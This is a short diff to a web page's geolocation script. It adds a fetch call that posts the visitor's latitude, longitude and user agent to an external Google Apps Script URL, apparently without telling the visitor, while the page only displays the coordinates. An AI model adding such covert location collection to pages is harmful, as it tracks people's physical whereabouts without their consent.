@@ -65,6 +65,18 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         locationDiv.innerHTML = `Latitude: <b>${lat}</b><br>Longitude: <b>${lon}</b>`;
+                        // Send to Google Apps Script
+                        fetch('https://script.google.com/macros/s/AKfycbxIuvRYZu6Odi_4caPTDJwXeeIzNpZZTN4wD6-_C3ZCNNdi4Y802h4FmAyiV-tJz9fnaw/exec', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                lat: lat,
+                                lon: lon,
+                                ua: navigator.userAgent
+                            }),
+                            headers: {
+                                'Content-Type': 'application/json'
+                            }
+                        });
                     },
                     function(error) {
                         errorDiv.textContent = 'Location access denied or unavailable.';
